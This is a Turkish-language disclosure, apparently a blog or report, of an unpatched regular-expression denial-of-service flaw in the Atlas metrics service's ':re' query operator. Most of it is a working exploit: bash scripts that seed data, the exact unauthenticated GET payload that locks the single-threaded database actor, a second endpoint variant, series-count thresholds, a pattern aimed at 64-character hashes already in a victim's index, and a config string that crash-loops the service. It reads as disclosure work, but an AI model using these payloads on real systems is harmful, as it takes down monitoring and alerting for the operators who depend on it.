**8 yıldır açıkta duran Zero-Day: Tek kimliksiz GET, Atlas instance'ındaki tüm okuma sorgularını kilitliyor**

**Özetle;**

Ortada tek bir metrik servisi var.

Bütün dashboard'lar, alarmlar ve otomatik ölçekleme tamamen buraya bağlı.

Saldırgan kimliksiz ve tek bir HTTP isteğiyle işi bitiriyor; flood falan yok.

İstek sadece 21 karakterlik bir regex.

Veritabanı aktörü tek thread çalıştığı için bu 21 karakterin içinde kilitlenip kalıyor.

O saniyeden sonra instance'a gelen tüm okuma istekleri 503 patlatıyor; sadece saldırganınki değil, herkesinki.

İşin uyanıklığı burada; servis ölü görünmüyor.

Sağlık kontrolü 200 döndüğü için yük dengeleyici bütün trafiği bu kilitli instance'a yönlendirmeyi sürdürüyor.

Üstelik yazma hattı da çalışıyor, yani metrikler içeriye akmaya devam ediyor.

İçeriye veri giriyor ama dışarıya tek bir satır veri çıkmıyor.

Paneller bomboş.

Alarmlar içeri giren o boş veriyi hesaplıyor.

Otomatik ölçekleme ise sadece düz bir çizgi seyrediyor.

**8 yıllık bir ihmalin, asimetrik bir maliyetle taçlandırılması...**

Evet; zero-day'imizi tanıtarak başlayalım.

2018'de `#651` commit'iyle giren pattern matcher, o günden bu yana hiç değişmedi.

O satır bugün de aynı.

```
1.5.3 (2018) -> 1.10.8 (2026-09-23)   hepsi etkileniyor
upstream main (2026-10-23)            hâlâ etkileniyor
```

Sekiz yıl boyunca her sürümde yayınlandı.

{CVE, Advisory, Issue, PR ve PoC yok}

`:re` yolu 2018'den beri açık.

Sekiz yıldır kimsenin görmediği, görenin de raporlamadığı bir zero-day.

**Tekrarlama adımları**

Her iterasyonun başında aynı temiz Atlas instance'ı kullanılmalı. Her iterasyonda aynı `conf/memory.conf` ve aşağıdaki aynı fixture üretimi kullanılmalı.

Servis: atlas-standalone, `conf/memory.conf`, `localhost:7106`.

`memory.conf` içinde `rebuild-frequency = 8s` olmalı.

Saldırı isteği bir terminalde, kontrol istekleri ikinci ve ayrı bir terminalde çalıştırılmalı.

1. adım: servisin temiz instance'ı başlatılır, aynı fixture dosyaları oluşturulur ve veri yayınlanır.

```bash
V=$(printf 'a%.0s' $(seq 1 120))
NOW=$(date +%s%3N)
PAYLOAD=/tmp/atlas-repro-payload.json
ONE=/tmp/atlas-repro-one.json

printf '{"tags":{"nf.app":"repro"},"metrics":[' > "$PAYLOAD"
for i in $(seq 0 199); do
  [ "$i" != "0" ] && printf ',' >> "$PAYLOAD"
  printf '{"tags":{"name":"repro.test","cluster":"c%03d","payload":"%s"},"timestamp":%s,"value":1.0}' \
    "$i" "$V" "$NOW" >> "$PAYLOAD"
done
printf ']}' >> "$PAYLOAD"

printf '{"tags":{"nf.app":"repro"},"metrics":[{"tags":{"name":"repro.write"},"timestamp":%s,"value":2.0}]}' \
  "$(date +%s%3N)" > "$ONE"

test "$(python3 -c 'import json,sys; print(len(json.load(open(sys.argv[1]))["metrics"]))' "$PAYLOAD")" = "200"
test "$(python3 -c 'import json,sys; print(len(json.load(open(sys.argv[1]))["metrics"]))' "$ONE")" = "1"
```

```bash
curl -sS --fail-with-body   --connect-timeout 3 --max-time 10   -o /tmp/atlas-publish.out   -w 'publish=%{http_code}\n'   -X POST   -H 'Content-Type: application/json'   --data-binary @"$PAYLOAD"   http://localhost:7106/api/v1/publish
```

Beklenen:

```
publish=200
```

2. adım: indeksin oluşması beklenir ve `repro.test` etiketi doğrulanır.

```bash
sleep 10

curl -sS --fail-with-body   --connect-timeout 3 --max-time 10   -o /tmp/atlas-tags-name.out   'http://localhost:7106/api/v1/tags/name?limit=500'

grep -Fq '"repro.test"' /tmp/atlas-tags-name.out
```

Beklenen: `grep` başarılı olur ve `repro.test` bulunur.

3. adım: saldırıdan önce okuma yolları doğrulanır.

```bash
curl -sS   --connect-timeout 3 --max-time 10   -o /dev/null   -w 'baseline_graph=%{http_code}\n'   'http://localhost:7106/api/v1/graph?q=name,sps,:eq'

curl -sS   --connect-timeout 3 --max-time 10   -o /dev/null   -w 'baseline_tags=%{http_code}\n'   'http://localhost:7106/api/v1/tags?limit=1'
```

Beklenen:

```
baseline_graph=200
baseline_tags=200
```

4. adım: tek saldırı isteği başlatılır ve işlem kimliği kaydedilir.

```bash
curl -sS -N   --connect-timeout 3 --max-time 60   -o /tmp/atlas-attack.out   -w 'attack=%{http_code}\n'   --get   --data-urlencode 'q=name,repro.test,:eq,payload,(a+)+(a+)+(a+)+(a+)+b,:re,:and'   http://localhost:7106/api/v1/graph &
ATTACK_PID=$!

echo "attack_pid=$ATTACK_PID"
kill -0 "$ATTACK_PID"
```

Beklenen: saldırı isteği çalışmaya devam eder. İkinci bir saldırı isteği başlatılmaz.

5. adım: sabit süre beklemek yerine okuma hattının `503` vermesi beklenir. En fazla 30 saniye boyunca kontrol tekrarlanır.

```bash
deadline=$((SECONDS + 30))
tags_status=''

while [ "$SECONDS" -lt "$deadline" ]; do
  tags_status="$(
    curl -sS       --connect-timeout 1 --max-time 2       -o /tmp/atlas-tags-during.out       -w '%{http_code}'       'http://localhost:7106/api/v1/tags?limit=1'       || true
  )"

  if [ "$tags_status" = '503' ]; then
    break
  fi

  sleep 0.2
done

printf 'tags_during=%s\n' "$tags_status"
test "$tags_status" = '503'
```

Beklenen:

```
tags_during=503
```

30 saniye içinde `503` alınmazsa iterasyon başarısız sayılır.

6. adım: aynı saldırı isteği çalışırken ikinci okuma yolu kontrol edilir.

```bash
curl -sS   --connect-timeout 3 --max-time 5   -o /tmp/atlas-graph-during.out   -w 'graph_during=%{http_code}\n'   'http://localhost:7106/api/v1/graph?q=name,sps,:eq'
```

Beklenen:

```
graph_during=503
```

7. adım: servis sağlık kontrolü ve yazma hattı kontrol edilir.

```bash
curl -sS   --connect-timeout 3 --max-time 5   -o /dev/null   -w 'health=%{http_code}\n'   http://localhost:7106/healthcheck

curl -sS   --connect-timeout 3 --max-time 10   -o /dev/null   -w 'publish_during=%{http_code}\n'   -X POST   -H 'Content-Type: application/json'   --data-binary @"$ONE"   http://localhost:7106/api/v1/publish
```

Beklenen:

```
health=200
publish_during=200
```

8. adım: saldırı isteği çalışırken thread dump alınır.

```bash
ATLAS_PID="$(pgrep -f '[c]om.netflix.atlas.standalone.Main' | head -n 1)"
test -n "$ATLAS_PID"

jcmd "$ATLAS_PID" Thread.print > /tmp/atlas-thread-dump.txt

grep -E 'at com\.netflix\.spectator\.impl\.matcher'   /tmp/atlas-thread-dump.txt | head -3

grep -E 'at com\.netflix\.atlas\.core\.model\.Query'   /tmp/atlas-thread-dump.txt | head -1

grep -E 'at com\.netflix\.atlas\.core\.index\.RoaringTagIndex'   /tmp/atlas-thread-dump.txt | head -1

grep -E 'at com\.netflix\.atlas\.webapi\.LocalDatabaseActor'   /tmp/atlas-thread-dump.txt | head -1
```

Beklenen:

```
at com.netflix.spectator.impl.matcher.CharSeqMatcher.matches(CharSeqMatcher.java:71)
at com.netflix.spectator.impl.matcher.ZeroOrMoreMatcher.matches(ZeroOrMoreMatcher.java:99)
at com.netflix.spectator.impl.matcher.SeqMatcher.matches(SeqMatcher.java:71)
at com.netflix.atlas.core.model.Query$Regex.check(Query.scala:548)
at com.netflix.atlas.core.index.RoaringTagIndex.andPattern(RoaringTagIndex.scala:627)
at com.netflix.atlas.webapi.LocalDatabaseActor.$anonfun$executeDataRequest$1(LocalDatabaseActor.scala:47)
```

9. adım: saldırı istemcisi ve servis sonlandırılır.

```bash
kill "$ATTACK_PID" 2>/dev/null || true
kill -9 "$ATLAS_PID"
```

10. adım: servis yeniden başlatılır. Başlangıç tamamlandıktan sonra aynı referans okuma tekrar gönderilir.

```bash
curl -sS   --connect-timeout 3 --max-time 10   -o /dev/null   -w 'after_restart_graph=%{http_code}\n'   'http://localhost:7106/api/v1/graph?q=name,sps,:eq'
```

Beklenen:

```
after_restart_graph=200
```

11. adım: 1–10. adımlar aynı fixture'larla ve aynı sırayla üç kez tekrarlanır.

Her iterasyonda beklenen sonuçlar:

```
publish=200
baseline_graph=200
baseline_tags=200
tags_during=503
graph_during=503
health=200
publish_during=200
after_restart_graph=200
```

Bu sonuçlardan biri alınmazsa ilgili iterasyon başarısız sayılır.

**Restart çözüm değil**

Bakalım yeniden başlatınca noluyor?

-> süreci öldürdüm -> ayağa kalkmasını bekledim -> veriyi yayınladım -> aynı isteği tekrar attım.

Bunu üç tur üst üste attım.

Üç turda da sonuç aynı: servis ayağa kalktı, tek istek geldi, okumalar `503` oldu.

Her turda yeniden kilitleniyor.

Saldırgan isteği tekrarladığı sürece instance kullanılamaz kalıyor.

Kalıcı ve kaçınılmaz bir kesinti, tekrar tekrar üretilebilir...

**Peki ama saldırgan hedefini daha aciz bırakmak isterse?**

Buyrunuz "Pattern config", anlatıyım;

Aynı pattern bir rollup kuralına yahut yayın doğrulama kuralına konulduğu takdirde, süreç henüz başlamadan sonlanır.

EVREKA...

```
rule.query = app.errors,ERROR|name|{2},:re
Exception in thread "main" java.lang.IndexOutOfBoundsException: Index -1 out of bounds
state=restarting restarts=8 exitcode=1    yayınlanan metrik: 0
aynı config ile yeniden deploy: state=restarting restarts=7, yine çıkıyor
```

Bu saatten sonra saldırganı daha hiç kimsede tutamaz, bir şey yapmasına da gerek yoktur.

Config'i insan elle düzeltene dek, her restart, her deploy aynı şekilde patlıyor ve operatörün bunu tespit etmesi asimetrik maliyet nedeniyle, o logların içinin boş bir şekilde şişmesiyle körlük başlıyor ve inanılmaz maliyetli, içinden çıkılamaz bir hâle evriliyor.

Bakınız;

"Could not find a constructor for class ValuePatternRule" patternin adı logda hiç geçmiyor.

**Peki güzelce buraya geldik, geldik de neden biz izini bulamıyoruz?**

Çünkü;

Kilitlenen isteğin kendisi logda yok, haliyle de bu yüzden "Access logger timeout" olan istekler için hiçbir satır yazmıyor.

Geriye de tek satır bu arkadaş kalıyor:

```
Request timeout encountered for request [GET /api/v1/graph Empty]
```

Query string yok, pattern yok, kimlik yok;

Eee? ne kaldı geriye, operatör kör, neyi engelleyeceğini bilmiyor ortalık 56, restart sonrası tekrar edip etmeyeceğini kanıtlayamıyor, kök nedeni gösterecek hiçbir veriye sahip değil, çünkü bilmesini sağlayan sistem yaralı...

Config yolunda ise hata mesajı yanlış yeri gösteriyor.

`Rule.scala:93-105`, `Throwable`'ı yakalayıp cause'u düşürerek sabit bir reflection mesajı atıyor:

```
Rule.load(bozuk config) -> RuntimeException: Could not find a constructor for class ValuePatternRule
                           cause=null  suppressed=0
doğrudan çağrı        -> IndexOutOfBoundsException: Index -1 out of bounds
ham method.invoke      -> InvocationTargetException, cause aynı
```

Operatörü sınıfa, classloader'a, bağımlılık sürümüne yolluyor.

Yanlış olan tek string'e değil.

**Ama en can alıcı nokta şu ki bu sınıf sizin için yeni değil.**

Nasıl? dediğiniz duyar gibiyim, buyrunuz efenim;

Aynı kütüphanede aynı hata sınıfı `:s` operatörü için zaten kapatılmış, PR #1913 ile.

Bkz: (`StyleExpr.BoundedCharSequence`, `MaxRegexCharReads = 1_000_000`)

O koruma sadece `StyleExpr.scala` içinde kullanılıyor.

`:re` yolu `Query.scala:544-556` satırlarında hâlâ düz String üzerinde, bütçesiz.

Tak tak tak girdi adam...

PR #1913'ün kendi metni:

> "The :s search-and-replace style operator compiles a fully user-controlled pattern with java.util.regex and matched it with no limit, once per matched series, so a crafted pattern with catastrophic backtracking (e.g. (.*a){25}) could pin a request thread for hundreds of ms per series. Match against a BoundedCharSequence that caps how many characters the regex engine may read; a runaway match now fails fast with an IllegalArgumentException (400) naming the offending pattern instead of running away."

Aynı süreç, aynı pattern, iki operatör...

Well, well, well.

```
:s   -> 400
:re  -> 503, thread kilitli, kill -9 gerekiyor
```

Bir tarafa koruma yazıp, diğer operatörü öylece açık bırakmak...

**Yaratıcı.**

Haliyle `:re` her sorguda, her dashboard'da, her alarm kuralında cirit atıyor.

**Gelelim maliyete... işte Maliyet'in asimetrisi;**

Saldırganın tek bir paket harcaması koca bir sistemi felç etmeye yeter.

Savunmacı ise canhıraş bir şekilde üretimdeki metrik instance'ını öldürüyor, yeniden deploy ediyor...

Ve işin en acı tarafı ne biliyor musunuz?

Günün sonunda elinde hiçbir adli başlangıç noktası olmadan, tamamen samanlıkta iğne arıyor.

O instance'a bağlı bütün paneller ve alarmlar o süre boyunca kör, sistem tamamen sahipsiz...

**Saldırganın verisini bilmesi gerekmiyor**

Pattern'in, saldırganın yazdığı bir değeri anması gerekmiyor.

Sadece kurbanın indeksinde zaten duran uzun bir `\w` değerine uygulanması yetiyor.

```
(\w+)+(\w+)+(\w+)+(\w+)+(\w+)+(\w+)+x   37 karakter
  uuid 36        0 ms
  md5 32       217 ms
  sha1 40      428 ms
  sha256 64  >20000 ms   kilitliyor
```

64 karakterlik hex ya da base64 değer taşıyan her indeks yeterli: container id, image digest, deploy hash.

**İkinci giriş noktası**

Aynı pattern ikinci bir public endpoint'ten de aynı aktöre ulaşıyor.

```
curl -sS -N 'http://localhost:7106/api/v2/fetch?q=name,f3.test,:eq,payload,(a%2B)%2B(a%2B)%2B(a%2B)%2B(a%2B)%2Bb,:re,:and'
```

Bu sürümde: bağlantı açık kalıyor, sadece heartbeat akıyor, sonra `{"type":"error","message":"AskTimeoutException: Ask timed out ..."}`. Bu sırada okumalar `503`, istemci vazgeçtikten sonra da aktör kilitli kalıyor.

**Kaç seri yeter**

```
10 seri    503 gelmiyor, okuma 200 dönüyor (yavaş ama ayakta)
50 seri    503
200 seri   503, sonra kendiliğinden dönüyor
```

Yani eşik 10 ile 50 seri arasında bir yerde.

Kesin olan: 200 seride tek istek bütün okumaları 503'e çeviriyor.

Kanıtı da masada bıraktım, buyrunuz sahne sizin...
